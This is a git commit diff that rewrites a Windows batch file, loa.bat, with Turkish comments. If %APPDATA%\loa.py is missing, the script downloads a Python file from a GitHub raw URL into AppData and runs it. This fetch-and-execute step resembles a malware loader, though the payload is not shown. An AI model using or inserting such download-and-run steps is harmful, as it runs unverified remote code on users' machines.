f9bb376ffa2e9d0d8048ad3e23a6083adfe75b88
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-09-07 13:55:06 +0300

    Update loa.bat

--- loa.bat
+++ loa.bat
@@ -1,3 +1,17 @@
-cd %appdata%
+@echo off
+set "pyfile=%APPDATA%\loa.py"
 
-python loa.py
+:: Python dosyası var mı kontrol et
+if exist "%pyfile%" (
+    echo [*] Dosya bulundu: %pyfile%
+    python "%pyfile%"
+) else (
+    echo [!] Dosya bulunamadı. İndiriliyor...
+    curl -L -o "%pyfile%" "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/create3.py"
+    if exist "%pyfile%" (
+        echo [+] Indirme basarili. Calistiriliyor...
+        python "%pyfile%"
+    ) else (
+        echo [-] Indirme basarisiz.
+    )
+)
